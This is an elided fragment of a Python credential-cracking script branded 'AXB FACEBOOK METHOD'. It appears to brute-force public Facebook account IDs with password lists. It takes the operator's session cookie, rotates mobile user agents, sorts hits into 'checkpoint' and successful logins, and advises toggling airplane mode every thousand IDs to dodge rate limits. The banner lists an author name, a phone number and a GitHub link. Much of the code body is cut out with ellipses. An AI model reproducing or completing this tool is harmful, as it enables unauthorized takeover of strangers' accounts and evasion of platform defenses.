...
╚══███╔╝██╔═══██╗╚██╗██╔╝
 ...
 ███╔╝  ██║   ██║ ██╔██╗ 
███████╗╚██████╔╝██╔╝ ██╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║AXB FACEBOOK METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : Z O X                 {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : +923165456679          {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/MR-AZAN/ZOX{N}  ║")
    print(f"║{P}[{H}•{P}] SC Status : Gratis rasa {H}Premiun{P}     {N}║")
    print(f"║{P}[{H}•{P}] Support   : 64bit                   {N}║")
    print(f"║{P}[{H}•{P}] Network   : {H}IM3{N}, {H}AXIS/XL{N}, {H}3{N}         ║")
    print(f"║{P}[{H}•{P}] SC Version: V-5.5 ({K}AXB{P})            {N}║")
    print("╚════════════════════════════════════════╝")
				''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}•{x}] Put Cookies :{asu} ')
...
def menu(my_name,my_id):
	...
	print('')
	cetak(nel('[cyan]1. Crack Public[cyan]\n0. Keluar [white]'))
...
def passwrd():
	...
	print(f'>> Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n');prog = Progress(SpinnerColumn('monkey'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
	with prog:
...
def crack(idf,pwv):
	...
	ua = random.choice(['Mozilla/5.0 (Java; U; en-us; samsung-gt-s3850) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.6.0.199/69/444/UCWEB Mobile UNTRUSTED/1.0','Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5 UCweb/1.10.6.900','Mozilla/5.0 (Linux; U; Android 11; en-US; Infinix X689 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36'])
	ua2 = random.choice(['Mozilla/5.0 (Linux; Android 7.1.1; 6; OPPO A79 Build/N6F26Q; wv G1883Z) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.8379.0.4873.119 Mobile Safari/537.36 T7/10.12 baiduboxapp/10.12.0.12 (Baidu; P1 7.1.1)Mozilla/5.0 (Linux; Android 7.1.1; OPPO A79 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36 T7/10.12 baiduboxapp/10.12.0.12 (Baidu; P1 7.1.1)'])
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel(statuscp1, title='Chekpoint X'))
				...
				cetak(nel(statusok1, title='Login ✓'))
